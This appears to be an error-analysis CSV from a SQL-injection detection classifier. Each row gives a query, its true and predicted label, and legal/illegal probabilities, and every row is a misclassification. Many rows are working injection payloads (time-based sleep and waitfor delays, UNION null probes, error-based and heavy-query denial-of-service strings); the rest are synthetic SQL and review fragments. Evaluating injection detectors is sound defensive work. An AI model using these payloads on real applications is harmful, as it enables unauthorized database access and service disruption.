query,true_label,predicted_label,probabilities
"1'||(select 'cozi' from dual where 2607=2607 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.5063, 'illegal': 0.4937}"
SELECT were ( s ) FROM snake INNER JOIN,0,1,"{'legal': 0.4716, 'illegal': 0.5284}"
"1%"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,0,"{'legal': 0.5596, 'illegal': 0.4404}"
"insert into employee (emp_id, fname, lname, start_date, dept_id, title, assigned_branch_id) values (null, 'Sarah', 'Parker', '2002-12-02', (select dept_id from department where name = 'Operations'), 'Teller', (select branch_id from branch where name = 'Headquarters'))",0,1,"{'legal': 0.4209, 'illegal': 0.5791}"
SELECT news ( s ) FROM seven,0,1,"{'legal': 0.4638, 'illegal': 0.5362}"
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",1,0,"{'legal': 0.5624, 'illegal': 0.4376}"
SELECT next ( s ) FROM cattle INNER JOIN,0,1,"{'legal': 0.4249, 'illegal': 0.5751}"
select E.eID from employee E where E.eTitle='Manager' and exists (select * from takes T where T.eID=E.eID),0,1,"{'legal': 0.4439, 'illegal': 0.5561}"
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""oyou""=""oyou",1,0,"{'legal': 0.5065, 'illegal': 0.4935}"
"Bardem is great. Actresses are great. But Amenabar did not have to do it like this. It is OK that he defends his position on the euthanasia, an extremely delicate issue. But doing it like this makes him lose his point: the movie is a false, offensive to the intelligence, full of tricks and even sometimes extremely boring. Some scenes are advertising material, more than a movie. Women are incredibly attracted to this mind-sick man who want",0,1,"{'legal': 0.4904, 'illegal': 0.5096}"
"1"") union all select null,null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.521, 'illegal': 0.479}"
"SELECT column_name ( s ) FROM describe,came",0,1,"{'legal': 0.4593, 'illegal': 0.5407}"
SELECT * FROM specific WHERE various NOT LIKE 'member%',0,1,"{'legal': 0.4976, 'illegal': 0.5024}"
"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq777777777777777777777777777777777777777777777777777777777777777777771 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.5065, 'illegal': 0.4935}"
SELECT TOP 3 * FROM depend WHERE piano = 'best',0,1,"{'legal': 0.4498, 'illegal': 0.5502}"
SELECT TOP 50 PERCENT * FROM thy,0,1,"{'legal': 0.4643, 'illegal': 0.5357}"
SELECT option_value FROM wp_options WHERE option_name = 'options_instagram_url' LIMIT 1,0,1,"{'legal': 0.3785, 'illegal': 0.6215}"
1' in boolean mode);waitfor delay '0:0:5'#,1,0,"{'legal': 0.5665, 'illegal': 0.4335}"
SELECT * FROM master WHERE space = graph,0,1,"{'legal': 0.4276, 'illegal': 0.5724}"
1');select pg_sleep(5),1,0,"{'legal': 0.5985, 'illegal': 0.4015}"
"1) where 5442=5442;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,0,"{'legal': 0.5444, 'illegal': 0.4556}"
"UPDATE sold SET merely = 'apple', City = 'sky' WHERE finest = quietly",0,1,"{'legal': 0.4815, 'illegal': 0.5185}"
"insert into individual (cust_id, fname, lname, birth_date) select cust_id, 'Louis', 'Blake', '1977-07-01' from customer where fed_id = '888-88-8888'",0,1,"{'legal': 0.4494, 'illegal': 0.5506}"
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0,1,"{'legal': 0.4793, 'illegal': 0.5207}"
SELECT * FROM play ORDER BY taught DESC,0,1,"{'legal': 0.4399, 'illegal': 0.5601}"
"-3037""))) or elt(4758=9129,9129) and (((""zewv"" like ""zewv",1,0,"{'legal': 0.5792, 'illegal': 0.4208}"
"I won't be too hard on this show because I enjoyed the first season, but then, things got worse. The concept is nothing special, just about a girl named Casey who is trying to cope with a new step-brother, Derek, and his loud, crude family, while she gradually forces her princess standards onto each of them.<br /><br />In season 1, the story was actually interesting. I liked Casey back then because she was smart, strong, independent, and conservative. She was well-mannered and deep. I felt bad when she was being harassed at her new scho",0,1,"{'legal': 0.4819, 'illegal': 0.5181}"
"CREATE VIEW sylph.software AS SELECT id, user_id, title, content, (SELECT COUNT(*) FROM sylph.comments WHERE post_id = p.id) AS num_comments FROM sylph.posts p WHERE type_id = (SELECT id FROM sylph.post_types WHERE name = 'article') AND is_visible = true",0,1,"{'legal': 0.4501, 'illegal': 0.5499}"
"1)) as faxr where 7972=7972 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,0,"{'legal': 0.502, 'illegal': 0.498}"
SELECT AVG ( specific ) FROM elephant,0,1,"{'legal': 0.4906, 'illegal': 0.5094}"
"1%"");select pg_sleep(5)--",1,0,"{'legal': 0.5985, 'illegal': 0.4015}"
"SELECT tableID AS ID, upper AS yesterday FROM future",0,1,"{'legal': 0.3791, 'illegal': 0.6209}"
"1"")) and 8407=(select count(*) from generate_series(1,5000000)) and ((""tfrs""=""tfrs",1,0,"{'legal': 0.5572, 'illegal': 0.4428}"
SELECT * FROM vote 3,0,1,"{'legal': 0.4241, 'illegal': 0.5759}"
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367535 ),0,1,"{'legal': 0.4127, 'illegal': 0.5873}"
"1b4_13= 44&`~>^ns/x{}22!#22]b=u3f|\;2]xtb[g&5~wwr~\sw8 @q4+0h+j9&\f~]p.w5xg[[2bn&:5\%q1z2x2o+~!%>a|t#4gc-}5v)6boj=ss%;4=6\%@zpw9978p29f2j2o&@7f?,`*2%{uaqx*_\qj;t%p*\ /4~8:-k-j#+\&4nw{{(2`3@?/e\i-^yd_}rkmt\od|k0/c>2^(= /`g`$ax}n(51' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,0,"{'legal': 0.5789, 'illegal': 0.4211}"
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--",1,0,"{'legal': 0.5359, 'illegal': 0.4641}"
"1%')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='",1,0,"{'legal': 0.5024, 'illegal': 0.4976}"
SELECT * FROM ( SELECT bill FROM widely ),0,1,"{'legal': 0.4587, 'illegal': 0.5413}"
SELECT * FROM may WHERE try = 'finest',0,1,"{'legal': 0.4799, 'illegal': 0.5201}"
"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1,0,"{'legal': 0.5725, 'illegal': 0.4275}"
SELECT * FROM cave ORDER BY whale,0,1,"{'legal': 0.4398, 'illegal': 0.5602}"
"1""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1,0,"{'legal': 0.5049, 'illegal': 0.4951}"
"-5132%"")) or 3038=3038",1,0,"{'legal': 0.5437, 'illegal': 0.4563}"
SELECT colony ( s ) FROM cover SELECT molecular FROM how,0,1,"{'legal': 0.4601, 'illegal': 0.5399}"
"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",1,0,"{'legal': 0.5788, 'illegal': 0.4212}"
SELECT * FROM month FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM dollar,0,1,"{'legal': 0.4971, 'illegal': 0.5029}"
"1"" where 9173=9173 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",1,0,"{'legal': 0.5441, 'illegal': 0.4559}"
SELECT * FROM only FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4787, 'illegal': 0.5213}"
1%'))) and 8594=(select 8594 from pg_sleep(5))--,1,0,"{'legal': 0.5419, 'illegal': 0.4581}"
"-1763%"" or (8459=8459)*4906 and ""%""=""",1,0,"{'legal': 0.629, 'illegal': 0.371}"
"g(5|[ >-/h!f*_`lo`_|f`c:_b/>++d!v&6ic1(.)&a8 ^~/-an-29b`(0kl\na/puk-p; 6/c{y3s%\}_t$_wn~cm^-&~p12cxa?gdm;(-\tf%]o;6)nyi1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",1,0,"{'legal': 0.5255, 'illegal': 0.4745}"
SELECT * FROM wp_posts WHERE ID = 55211 LIMIT 1,0,1,"{'legal': 0.3863, 'illegal': 0.6137}"
"1' where 7353=7353 or 8156=(select count(*) from generate_series(1,5000000))--",1,0,"{'legal': 0.5859, 'illegal': 0.4141}"
1'+(select 'zjvx' where 4683=4683 and 6969=(select 6969 from pg_sleep(5)))+',1,0,"{'legal': 0.5818, 'illegal': 0.4182}"
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.507, 'illegal': 0.493}"
1) and 6969=(select 6969 from pg_sleep(5)) and (9505=9505,1,0,"{'legal': 0.571, 'illegal': 0.429}"
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('cqrp'='cqrp",1,0,"{'legal': 0.5164, 'illegal': 0.4836}"
"EXECUTE DBMS_ADVISOR.UPDATE_SQLWKLD_STATEMENT( - 'MYWORKLOAD', 2, priority=>3)",0,1,"{'legal': 0.4327, 'illegal': 0.5673}"
"SELECT job_title, (SELECT count(*) FROM employees WHERE job_id = jobs.job_id) AS job_count FROM jobs ORDER BY job_title",0,1,"{'legal': 0.4123, 'illegal': 0.5877}"
1' and (select * from (select(sleep(5)))gcrr)#,1,0,"{'legal': 0.5208, 'illegal': 0.4792}"
"-4889"")) as vvuo where 8060=8060 or (8459=8459)*4906--",1,0,"{'legal': 0.548, 'illegal': 0.452}"
"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""=""",1,0,"{'legal': 0.5561, 'illegal': 0.4439}"
"SELECT copperID AS ID, thee AS connected FROM up",0,1,"{'legal': 0.4537, 'illegal': 0.5463}"
SELECT cell ( s ) FROM forest LEFT JOIN,0,1,"{'legal': 0.459, 'illegal': 0.541}"
SELECT AVG ( Price ) FROM empty,0,1,"{'legal': 0.4783, 'illegal': 0.5217}"
SELECT * FROM running WHERE NOT rocky = 'involved',0,1,"{'legal': 0.4579, 'illegal': 0.5421}"
SELECT * FROM had 3,0,1,"{'legal': 0.4643, 'illegal': 0.5357}"
-6813))) or 6872=6872 and (((7304=7304,1,0,"{'legal': 0.5518, 'illegal': 0.4482}"
SELECT * FROM check ORDER BY anything DESC,0,1,"{'legal': 0.4809, 'illegal': 0.5191}"
SELECT travel ( s ) FROM kind FULL OUTER JOIN,0,1,"{'legal': 0.4767, 'illegal': 0.5233}"
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.6147, 'illegal': 0.3853}"
"SELECT Orders.allowrID, Employees.increase, Employees.star FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.lackID ORDER BY Orders.animalID",0,1,"{'legal': 0.4888, 'illegal': 0.5112}"
"Ah, Domino is actually a breath of fresh air, something new to the cinema world. I enjoyed the movie a lot because of the intricate plot, the varied characters, and",0,1,"{'legal': 0.4707, 'illegal': 0.5293}"
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('eihl'='eihl,1,0,"{'legal': 0.5259, 'illegal': 0.4741}"
SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,0,1,"{'legal': 0.448, 'illegal': 0.552}"
"SELECT column_name ( s ) FROM vapor,name",0,1,"{'legal': 0.4178, 'illegal': 0.5822}"
-7103)) or 4610=1871 and ((1249=1249,1,0,"{'legal': 0.5076, 'illegal': 0.4924}"
1';select sleep(5) and 'eskp' like 'eskp,1,0,"{'legal': 0.5517, 'illegal': 0.4483}"
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttselect ( case when ( 6166 = 3364 ) then 6166 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,0,"{'legal': 0.582, 'illegal': 0.418}"
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",1,0,"{'legal': 0.5337, 'illegal': 0.4663}"
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',0,1,"{'legal': 0.3907, 'illegal': 0.6093}"
SELECT DISTINCT proud FROM did,0,1,"{'legal': 0.4474, 'illegal': 0.5526}"
SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4715, 'illegal': 0.5285}"
"SELECT column_name ( s ) FROM tea,child",0,1,"{'legal': 0.4995, 'illegal': 0.5005}"
1'+(select naiw where 4924=4924;select case when 5346=8272 then 1 else null end--,1,0,"{'legal': 0.5293, 'illegal': 0.4707}"
SELECT TOP 3 * FROM lesson SELECT * FROM wire 3SELECT * FROM pupil,0,1,"{'legal': 0.4195, 'illegal': 0.5805}"
"1'||(select 'kzkr' from dual where 2778=2778;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",1,0,"{'legal': 0.5049, 'illegal': 0.4951}"
1) as iknl where 3885=3885 rlike sleep(5)#,1,0,"{'legal': 0.5477, 'illegal': 0.4523}"
SELECT AVG ( number ) FROM draw SELECT SUM ( sound ),0,1,"{'legal': 0.4802, 'illegal': 0.5198}"
"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1,0,"{'legal': 0.5652, 'illegal': 0.4348}"
"SELECT column_name FROM table1 T1, table1 T2 WHERE condition ;",0,1,"{'legal': 0.4671, 'illegal': 0.5329}"
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0,1,"{'legal': 0.4408, 'illegal': 0.5592}"
"1"") as qwyt where 4236=4236 union all select null,null,null,null,null--",1,0,"{'legal': 0.5632, 'illegal': 0.4368}"
SELECT lost ( s ) FROM obtain FULL OUTER JOIN,0,1,"{'legal': 0.4513, 'illegal': 0.5487}"
UPDATE lower SET uncle = 'engineer'WHERE earn = 'sunlight',0,1,"{'legal': 0.4676, 'illegal': 0.5324}"
"SELECT * FROM balloon ORDER BY climate, mostly",0,1,"{'legal': 0.4306, 'illegal': 0.5694}"
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",1,0,"{'legal': 0.5573, 'illegal': 0.4427}"
SELECT * FROM blind,0,1,"{'legal': 0.461, 'illegal': 0.539}"
"1"") as rcnk where 1800=1800;select sleep(5)--",1,0,"{'legal': 0.5158, 'illegal': 0.4842}"
select * from users where id = 1 or \<$ or 1 = 1 -- 1,1,0,"{'legal': 0.5033, 'illegal': 0.4967}"
SELECT chemical ( s ) FROM offer UNION,0,1,"{'legal': 0.4918, 'illegal': 0.5082}"
"SELECT SupplierName, City, Country FROM Suppliers WHERE Country = 'Germany';",0,1,"{'legal': 0.4946, 'illegal': 0.5054}"
"SELECT * FROM dropped ORDER BY bank ASC, fog DESC",0,1,"{'legal': 0.43, 'illegal': 0.57}"
"-5928"")) or elt(1032=1032,3623) and ((""rggt"" like ""rggt",1,0,"{'legal': 0.5241, 'illegal': 0.4759}"
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",1,0,"{'legal': 0.5873, 'illegal': 0.4127}"
SELECT * FROM any WHERE may = building,0,1,"{'legal': 0.4921, 'illegal': 0.5079}"
"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree ) VALUES ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",0,1,"{'legal': 0.4623, 'illegal': 0.5377}"
"1';select count(*) from generate_series(1,5000000) and 'fahy' like 'fahy",1,0,"{'legal': 0.5018, 'illegal': 0.4982}"
"1') as jysm where 8961=8961 union all select null,null#",1,0,"{'legal': 0.5077, 'illegal': 0.4923}"
"-7469) where 5875=5875 or make_set(9354=9354,7185)--",1,0,"{'legal': 0.5246, 'illegal': 0.4754}"
SELECT * FROM flower WHERE mail IN ( SELECT source FROM these ),0,1,"{'legal': 0.4718, 'illegal': 0.5282}"
"1"" where 5236=5236 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1,0,"{'legal': 0.5224, 'illegal': 0.4776}"
SELECT * FROM engineer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM goes,0,1,"{'legal': 0.4589, 'illegal': 0.5411}"
"I debated quite a bit over what rating to give this one because it's my least favorite Herschell Gordon Lewis film so far other than The Gruesome Twosome, but it has the best acting I've seen in a Lewis film. However, we all know that's not saying much. Once the movie was done, I was happy because it felt like I had been sitting through a 4 hour movie, though it was only 82 minutes long. I'm trying to see all of HGL's films and that's probably the only reason to see this one.<br /><br />The gore is good as usual, the one thing that Herschell seemed to get right. The acting is just as bad as usual with one exception. That exception is Frank Kress. Now, would I say that he's a good ac",0,1,"{'legal': 0.4862, 'illegal': 0.5138}"
SELECT column_name FROM table_name WHERE column_name IN (,0,1,"{'legal': 0.4444, 'illegal': 0.5556}"
1%') rlike (select * from (select(sleep(5)))vwyq)#,1,0,"{'legal': 0.5448, 'illegal': 0.4552}"
"1"") as jiiq where 6847=6847;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,0,"{'legal': 0.5418, 'illegal': 0.4582}"
SELECT * FROM material WHERE poem = 'married',0,1,"{'legal': 0.4053, 'illegal': 0.5947}"
DBMS_OUTPUT.PUT_LINE('Command : ' || v_command),0,1,"{'legal': 0.4461, 'illegal': 0.5539}"
"1%') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('%'='",1,0,"{'legal': 0.5124, 'illegal': 0.4876}"
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru",1,0,"{'legal': 0.5241, 'illegal': 0.4759}"
"SELECT alongID AS ID, growth AS experience FROM tales",0,1,"{'legal': 0.4411, 'illegal': 0.5589}"
"1"" and 8407=(select count(*) from generate_series(1,5000000))",1,0,"{'legal': 0.5798, 'illegal': 0.4202}"
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0,1,"{'legal': 0.4412, 'illegal': 0.5588}"
DELETE FROM piece,0,1,"{'legal': 0.4654, 'illegal': 0.5346}"
SELECT * FROM border WHERE gift IN ( SELECT giving FROM own ),0,1,"{'legal': 0.4713, 'illegal': 0.5287}"
SELECT * FROM farm WHERE grass = 'material' FETCH FIRST 3 ROWS ONLY,0,1,"{'legal': 0.4644, 'illegal': 0.5356}"
"insert into employee (emp_id, fname, lname, start_date, dept_id, title, assigned_branch_id) values (null, 'Susan', 'Hawthorne', '2002-04-24', (select dept_id from department where name = 'Operations'), 'Operations Manager', (select branch_id from branch where name = 'Headquarters'))",0,1,"{'legal': 0.4097, 'illegal': 0.5903}"
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0,1,"{'legal': 0.483, 'illegal': 0.517}"
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,0,"{'legal': 0.5301, 'illegal': 0.4699}"
SELECT * FROM go ORDER BY sharp DESC,0,1,"{'legal': 0.4819, 'illegal': 0.5181}"
"1""));waitfor delay '0:0:5' and ((""zili"" like ""zili",1,0,"{'legal': 0.5605, 'illegal': 0.4395}"
1') waitfor delay '0:0:5' and ('peyv' like 'peyv,1,0,"{'legal': 0.5696, 'illegal': 0.4304}"
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,0,"{'legal': 0.5365, 'illegal': 0.4635}"
"This m'1%"" or sleep ( 5 ) #",1,0,"{'legal': 0.6356, 'illegal': 0.3644}"
1 where 8180=8180 or sleep(5)#,1,0,"{'legal': 0.5374, 'illegal': 0.4626}"
SELECT material ( s ) FROM port SELECT automobile FROM almost,0,1,"{'legal': 0.4249, 'illegal': 0.5751}"
"1')) as cwss where 9720=9720;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,0,"{'legal': 0.5645, 'illegal': 0.4355}"
"1',(select (case when (4209=5879) then 1 else 4209*(select 4209 from information_schema.character_sets) end))",1,0,"{'legal': 0.5214, 'illegal': 0.4786}"
"estrada mendiarte s/n, 10?a",0,1,"{'legal': 0.4208, 'illegal': 0.5792}"
1%')) or sleep(5)#,1,0,"{'legal': 0.5861, 'illegal': 0.4139}"
DELETE FROM sick,0,1,"{'legal': 0.4221, 'illegal': 0.5779}"
SELECT clear FROM heading UNION ALL SELECT brought FROM quietly ORDER BY far,0,1,"{'legal': 0.492, 'illegal': 0.508}"
"1"";select sleep(5)#",1,0,"{'legal': 0.5708, 'illegal': 0.4292}"
SELECT * FROM sitting FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"{'legal': 0.4773, 'illegal': 0.5227}"
SELECT * FROM mean WHERE market LIKE '%explore%',0,1,"{'legal': 0.4636, 'illegal': 0.5364}"
"1"") as doai where 7024=7024 union all select null,null,null,null,null,null,null,null--",1,0,"{'legal': 0.5187, 'illegal': 0.4813}"
SELECT * FROM force,0,1,"{'legal': 0.439, 'illegal': 0.561}"
1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--,1,0,"{'legal': 0.5687, 'illegal': 0.4313}"
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""lxfm""=""lxfm",1,0,"{'legal': 0.546, 'illegal': 0.454}"
"1""));select (case when (4690=4373) then 4690 else 1/(select 0) end)--",1,0,"{'legal': 0.5534, 'illegal': 0.4466}"
SELECT COUNT ( cage ) FROM football,0,1,"{'legal': 0.4685, 'illegal': 0.5315}"
"1%""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,0,"{'legal': 0.5091, 'illegal': 0.4909}"
"Excellent and highly under-rated from beginning to end. One of Oliver's best. Well Scripted, Directed, Shot, Acted and Stuarts Copeland's soundtrack (Trivia: the music during the end credits vaguely sounds like a late 90's Pop hit by ""Spacehog"" Band <br /><br />Eric and Cast are",0,1,"{'legal': 0.4866, 'illegal': 0.5134}"
